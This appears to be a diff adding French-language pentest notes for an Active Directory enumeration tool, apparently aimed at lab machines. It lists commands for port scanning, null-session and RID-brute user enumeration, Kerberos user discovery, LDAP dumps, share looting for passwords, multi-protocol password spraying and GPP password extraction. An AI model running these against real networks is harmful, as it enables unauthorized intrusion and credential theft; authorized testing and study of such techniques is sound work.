@@ -1,0 +1,134 @@
+nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt
+
+ensuite les ports qui sont ouverts je les scan avec cela:
+
+sleep 5 && nmap -Pn $target -p <les ports> -sV -sC -v -oN nmap_sVsC.txt
+
+puis je fais cela
+
+sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
+
+donc la on doit pouvoir savoir si c un AD le nom de domaine le nom du dc. donc on doit pouvoir sortir ces infos. 
+
+Des fois on nous donnes des creds donc on doit pouvoir les specifier dans la commande pour l ancer l'outil
+
+ensuite je fais cela :
+
+# Enum4linux / RPC
+enum4linux -a <IP>                                      # Null session complete
+enum4linux -U <IP>  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+
+rpcclient -U '' -N <IP>                                 # Null session
+
+rpcclient $> enumdomusers
+
+rpcclient -U '' -N <IP> -c 'enumdomusers' | cut -d'[' -f2 | cut -d']' -f1 > users.txt
+ 
+
+rpcclient $> queryuser <RID>
+rpcclient $> exit
+
+# RID cycling (user enum)
+lookupsid.py guest@<IP> -no-pass                        # RID brute + users / groups
+netexec smb <IP> -u guest -p '' --rid-brute             # RID brute (si autorisé)
+
+# Null session NetExec 
+netexec smb <IP> -u '' -p ''                            # Banner / infos SMB (OS, domain, signing)
+netexec smb <IP> -u '' -p '' --rid-brute                # RID brute (souvent LSAD ACCESS_DENIED)
+netexec smb <IP> -u '' -p '' --users                    # Enum users (souvent bloqué)
+netexec smb <IP> -u 'Guest' -p '' --users               # Test Guest (souvent disabled)
+
+# SMB shares anonymes
+netexec smb <IP> -u '' -p '' --shares                   # Shares (souvent STATUS_ACCESS_DENIED)
+smbclient -N -L //<IP>                                  # Shares anonymes
+
+# Avec creds
+crackmapexec smb 172.16.5.5 -u <user> -p <password> --users
+crackmapexec smb 172.16.5.5 -u <user> -p <password> --groups
+crackmapexec smb 172.16.5.130 -u <user> -p <password> --loggedon-users
+
+# DNS SRV -> DCs
+dig _ldap._tcp.dc._msdcs.<domain> SRV @<dns_ip>         # DC discovery
+
+# User enum par Kerberos
+kerbrute userenum --dc <dc_ip> -d <domain> users.txt    # Enum users via pre-auth
+
+# jsmith.txt wordlist from the statistically-likely-usernames GitHub repo
+kerbrute userenum -d <domain> --dc <dc_ip> /opt/jsmith.txt 
+
+# sortie de fichier avec les users valides
+kerbrute userenum -d <domain> --dc <dc_ip> /opt/jsmith.txt 2>/dev/null \
+| grep -E "VALID" \
+| awk '{print $NF}' \
+> valid_users.txt
+
+# pour enlever tout ce qui est après le '@' et avoir que les pseudos dans le fichier
+sed -i 's/@.*//' valid_users.txt
+
+
+ldapsearch -x -H ldap://<IP> -b "DC=HTB,DC=LOCAL" "(&(objectClass=user))" sAMAccountName \
+| awk -F': ' '/^sAMAccountName:/{print $2}'
+
+
+# Avec windapsearch
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+
+# Connexion et listing
+smbclient //<IP>/<share> -N                             # Null
+smbclient //<IP>/<share> -U '<user>%<pass>'             # Authentifié
+
+# Shares via NetExec
+netexec smb <IP> -u <user> -p <pass> --shares           # Liste + droits
+netexec smb <IP> -u '' -p '' --shares                   # Null session (souvent refusé)
+
+# Crawling automatique des partages
+netexec smb <IP> -u <user> -p <pass> -M spider_plus     # Crawl + JSON de fichiers intéressants
+
+# Outils complémentaires
+manspider.py --threads 256 <CIDR> -u <user> -p <pass> \
+  --ext doc,docx,xlsx,pdf --content 'password|cred|secret'   # Loot automatique
+
+  # LDAP basique (anonymous si possible)
+ldapsearch -x -H ldap://<dc_ip> -b "dc=domain,dc=local" "(objectClass=*)" \
+  dn sAMAccountName userPrincipalName memberOf -E pr=2000/noprompt
+
+# NetExec LDAP (issu des images) — souvent "bind required"
+netexec ldap <IP> -u '' -p '' --users
+
+# Dump structuré (ldapdomaindump) (avec creds)
+ldapdomaindump ldap://<dc_ip> -u '<DOMAIN>\<user>' -p '<pass>'
+
+# DNS AD intégré
+adidnsdump -u '<user>@<domain>' -p '<pass>' <domain>
+
+# Dump des descritpions utiles
+ldapsearch -x -H ldap://<DC-IP> \
+  -D "<user>@<DOMAIN>" -w '<password>' \
+  -b "DC=<DOMAIN>,DC=<TLD>" \
+  "(&(objectClass=user)(description=*))" \
+  samaccountname description 2>/dev/null \
+  | awk '/^description:/{desc=substr($0, index($0,$2))} /^sAMAccountName:/{print $2 "\t→\t" desc}' \
+  | grep -v -iE "built-in|key distribution|guest access"
+
+  l outil doit proposer de spray avec des password classiques
+
+  # Spray NTLM sur plusieurs protocols
+netexec smb <targets.txt> -u users.txt -p 'Password123!' --continue-on-success
+netexec winrm <targets> -u users.txt -p 'Password123!'
+netexec mssql <targets> -u users.txt -p 'Password123!'
+netexec rdp <targets> -u users.txt -p 'Password123!'
+
+# OPSEC : limiter lockout
+netexec smb <targets> -u users.txt -p 'Password123!' --auth-fail-limit 3 --delay 5
+
+Si on a donne des creds dans la commande on doit faire cela :
+
+smbclient -U "<domain>/<user>%<pass>" -L //<dc_ip>
+smbclient -U "<domain>/<user>%<pass>" //<dc_ip>/SYSVOL
+
+crackmapexec smb <dc_ip> -u <user> -p '<pass>' -M gpp_password
+nxc smb <dc_ip> -u <user> -p '<pass>' -M gpp_password
+
+crackmapexec smb <dc_ip> -u <user> -p '<pass>' -M gpp_autologin
+nxc smb <dc_ip> -u <user> -p '<pass>' -M gpp_autologin
+
